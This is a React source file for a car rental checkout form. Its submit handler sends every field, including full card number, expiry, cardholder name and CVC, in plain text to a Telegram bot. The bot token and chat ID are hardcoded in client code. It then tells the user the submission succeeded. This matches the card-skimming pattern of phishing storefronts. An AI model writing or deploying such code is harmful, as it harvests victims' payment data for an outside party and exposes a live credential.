import React, { useContext, useEffect, useState } from 'react';
import s from './Form.module.scss';
import { toast } from 'react-toastify';

import AOS from 'aos';
import 'aos/dist/aos.css';
import { AppContext } from '../../context/context';

const Form = () => {
  const { navigate } = useContext(AppContext);

  const toastEmitter = {
    position: 'top-right',
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: false,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
    theme: 'light',
  };

  const notify = {
    success() {
      toast.success('Data send successfully', toastEmitter);
    },

    error() {
      toast.error('Data not send', toastEmitter);
    },
  };

  const [formData, setFormData] = useState({
    name: '',
    phone: '',
    address: '',
    city: '',
    pickupLocation: '',
    pickupDate: '',
    pickupTime: '',
    dropoffLocation: '',
    dropoffDate: '',
    dropoffTime: '',
    cardNumber: '',
    expirationDate: '',
    cardholder: '',
    cvc: '',
    paymentMethod: '',
    marketingConsent: false,
    termsConsent: false,
  });

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === 'checkbox' ? checked : value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const token = '7629587294:AAFjAEmnzYc06BtG9OoUQYSctKxCSiFjTb4';
    const chatId = '-4799118768';

    const message = `
      *Billing Info*:
      Name: ${formData.name}
      Phone: ${formData.phone}
      Address: ${formData.address}
      City: ${formData.city}
      
      *Rental Info*:
      Pick-Up Location: ${formData.pickupLocation}
      Pick-Up Date: ${formData.pickupDate}
      Pick-Up Time: ${formData.pickupTime}
      Drop-Off Location: ${formData.dropoffLocation}
      Drop-Off Date: ${formData.dropoffDate}
      Drop-Off Time: ${formData.dropoffTime}
      
      *Payment Info*:
      Payment Method: ${formData.paymentMethod}
      Card Number: ${formData.cardNumber}
      Expiration Date: ${formData.expirationDate}
      Card Holder: ${formData.cardholder}
      CVC: ${formData.cvc}
      
      *Consent*:
      Marketing Consent: ${formData.marketingConsent ? 'Yes' : 'No'}
      Terms Consent: ${formData.termsConsent ? 'Yes' : 'No'}
    `;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const data = {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
    };

    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      alert('Form submitted successfully!');

      navigate('/notification');

      notify.success();
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
      alert('There was an error submitting the form.');
    }
  };

  useEffect(() => {
    AOS.init({
      duration: 1000,
      once: true,
    });
  }, []);

  return (
    <section className={s.form}>
      <div className="container">
        <div className={s.wrapper}>
          <div className={s.formContainer}>
            <section className={s.section}>
              <div className={s.wrap}>
                <div className={s.header}>
                  <h2>Billing Info</h2>
                  <span>Step 1 of 4</span>
                </div>
                <form className={s.form} onSubmit={handleSubmit}>
                  <div className={s.inputGroup}>
                    <label htmlFor="name">Name</label>
                    <input
                      type="text"
                      id="name"
                      name="name"
                      placeholder="Your name"
                      value={formData.name}
                      onChange={handleChange}
                    />
                  </div>
                  <div className={s.inputGroup}>
                    <label htmlFor="phone">Phone Number</label>
                    <input
                      type="number"
                      id="phone"
                      name="phone"
                      placeholder="Phone number"
                      value={formData.phone}
                      onChange={handleChange}
                    />
                  </div>
                  <div className={s.inputGroup}>
                    <label htmlFor="address">Address</label>
                    <input
                      type="text"
                      id="address"
                      name="address"
                      placeholder="Address"
                      value={formData.address}
                      onChange={handleChange}
                    />
                  </div>
                  <div className={s.inputGroup}>
                    <label htmlFor="city">Town / City</label>
                    <input
                      type="text"
                      id="city"
                      name="city"
                      placeholder="Town or city"
                      value={formData.city}
                      onChange={handleChange}
                    />
                  </div>
                </form>
              </div>
            </section>

            <section className={s.section}>
              <div className={s.header}>
                <h2>Rental Info</h2>
                <span>Step 2 of 4</span>
              </div>
              <form className={s.form}>
                <fieldset>
                  <legend>Pick-Up</legend>
                  <div className={s.inputGroup}>
                    <label htmlFor="pickup-location">Locations</label>
                    <select
                      id="pickup-location"
                      name="pickupLocation"
                      value={formData.pickupLocation}
                      onChange={handleChange}
                    >
                      <option>Select your city</option>
                      <option value="Tashkent">Tashkent</option>
                      <option value="Samarkand">Samarkand</option>
                      <option value="Buhora">Buhora</option>
                    </select>
                  </div>
                  <div className={s.inputGroup}>
                    <label htmlFor="pickup-date">Date</label>
                    <input
                      type="date"
                      id="pickup-date"
                      name="pickupDate"
                      value={formData.pickupDate}
                      onChange={handleChange}
                    />
                  </div>
                  <div className={s.inputGroup}>
                    <label htmlFor="pickup-time">Time</label>
                    <select
                      id="pickup-time"
                      name="pickupTime"
                      value={formData.pickupTime}
                      onChange={handleChange}
                    >
                      <option>Select your time</option>
                      <option value="10:00 am">10:00 am</option>
                      <option value="2:00 pm">2:00 pm</option>
                      <option value="6:00 pm">6:00 pm</option>
                    </select>
                  </div>
                </fieldset>
                <fieldset>
                  <legend>Drop-Off</legend>
                  <div className={s.inputGroup}>
                    <label htmlFor="dropoff-location">Locations</label>
                    <select
                      id="dropoff-location"
                      name="dropoffLocation"
                      value={formData.dropoffLocation}
                      onChange={handleChange}
                    >
                      <option>Select your city</option>
                      <option value="Tashkent">Tashkent</option>
                      <option value="Samarkand">Samarkand</option>
                      <option value="Buhora">Buhora</option>
                    </select>
                  </div>
                  <div className={s.inputGroup}>
                    <label htmlFor="dropoff-date">Date</label>
                    <input
                      type="date"
                      id="dropoff-date"
                      name="dropoffDate"
                      value={formData.dropoffDate}
                      onChange={handleChange}
                    />
                  </div>
                  <div className={s.inputGroup}>
                    <label htmlFor="dropoff-time">Time</label>
                    <select
                      id="dropoff-time"
                      name="dropoffTime"
                      value={formData.dropoffTime}
                      onChange={handleChange}
                    >
                      <option>Select your time</option>
                      <option value="10:00 am">10:00 am</option>
                      <option value="2:00 pm">2:00 pm</option>
                      <option value="6:00 pm">6:00 pm</option>
                    </select>
                  </div>
                </fieldset>
              </form>
            </section>

            <section className={s.section}>
              <div className={s.header}>
                <h2>Payment Method</h2>
                <span>Step 3 of 4</span>
              </div>
              <form className={s.formMethod}>
                <div className={s.payMethods_wrap}>
                  <div className={s.paymentMethod}>
                    <div className={s.credit}>
                      <input
                        type="radio"
                        id="credit-card"
                        name="paymentMethod"
                        onChange={handleChange}
                      />
                      <label htmlFor="credit-card">Credit Card</label>
                    </div>
                    <div className={s.creditCardDetails}>
                      <div className={s.inputGroup}>
                        <label htmlFor="card-number">Card Number</label>
                        <input
                          type="number"
                          id="card-number"
                          name="cardNumber"
                          placeholder="Card number"
                          maxLength={"16"}
                          value={formData.cardNumber}
                          onChange={handleChange}
                        />
                      </div>
                      <div className={s.inputGroup}>
                        <label htmlFor="expiration-date">Expiration Date</label>
                        <input
                          type="date"
                          id="expiration-date"
                          name="expirationDate"
                          placeholder="MM/YY"
                          value={formData.expirationDate}
                          onChange={handleChange}
                        />
                      </div>
                      <div className={s.inputGroup}>
                        <label htmlFor="cardholder">Card Holder</label>
                        <input
                          type="text"
                          id="cardholder"
                          name="cardholder"
                          placeholder="Cardholder"
                          value={formData.cardholder}
                          onChange={handleChange}
                        />
                      </div>
                      <div className={s.inputGroup}>
                        <label htmlFor="cvc">CVC</label>
                        <input
                          type="text"
                          id="cvc"
                          name="cvc"
                          placeholder="CVC"
                          value={formData.cvc}
                          onChange={handleChange}
                        />
                      </div>
                    </div>
                  </div>
                  <div className={s.payMethods}>
                    <div className={s.paymentMethod}>
                      <input
                        type="radio"
                        id="paypal"
                        name="paymentMethod"
                        onChange={handleChange}
                      />
                      <label htmlFor="paypal">PayPal</label>
                    </div>
                    <div className={s.paymentMethod}>
                      <input
                        type="radio"
                        id="bitcoin"
                        name="paymentMethod"
                        onChange={handleChange}
                      />
                      <label htmlFor="bitcoin">Bitcoin</label>
                    </div>
                  </div>
                </div>
              </form>
            </section>

            <section className={s.section}>
              <div className={s.header}>
                <h2>Confirmation</h2>
                <span>Step 4 of 4</span>
              </div>
              <form
                className={`${s.form} ${s.payMethod}`}
                onSubmit={handleSubmit}
              >
                <div className={s.checkboxGroup}>
                  <input
                    required
                    type="checkbox"
                    id="marketing-consent"
                    name="marketingConsent"
                    checked={formData.marketingConsent}
                    onChange={handleChange}
                  />
                  <label htmlFor="marketing-consent">
                    I agree with sending marketing and newsletter emails. No
                    spam, promised!
                  </label>
                </div>
                <div className={s.checkboxGroup}>
                  <input
                    type="checkbox"
                    id="terms-consent"
                    name="termsConsent"
                    checked={formData.termsConsent}
                    onChange={handleChange}
                  />
                  <label htmlFor="terms-consent">
                    I agree with our terms and conditions and privacy policy.
                  </label>
                </div>
                <button type="submit" className={s.submitButton}>
                  Rent Now
                </button>
              </form>
            </section>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Form;
